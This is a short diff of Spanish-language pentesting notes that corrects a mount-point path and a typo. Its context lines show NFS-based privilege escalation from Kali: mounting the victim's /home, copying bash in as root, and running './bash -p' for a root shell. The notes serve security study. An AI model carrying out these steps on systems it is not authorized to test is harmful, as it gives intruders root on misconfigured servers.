@@ -196,7 +196,7 @@ Paso 4: # Desde Kali se hace la ESCALADA a ROOT
 ❯ mount -t nfs <IP>:/home /tmp/nfs      # Montar el directorio de la víctima en el dir '/tmp/nfs' de Kali 
 	# IP = Dirección IP del server víctima 
 	# /home = Es el directorio que muestra el primer comando 
-	# /tmp/disk_mnt = Es el dir creado en Kali 
+	# /tmp/nfs = Es el dir creado en Kali 
 
 # Ingresar a la montura '/tmp/nfs' copiada en Kali y copiar la 'bash' de kali a ese dir para hacerla root
 ❯ sudo cp /bin/bash .
@@ -213,5 +213,5 @@ Paso 5:
 ❯ ./bash -p         
 
 Paso 6: 
-❯ umount disk_mnt        # Al finalizar desmontaar el directorio   
+❯ umount /tmp/nfs        # Al finalizar desmontar el directorio   
 ```
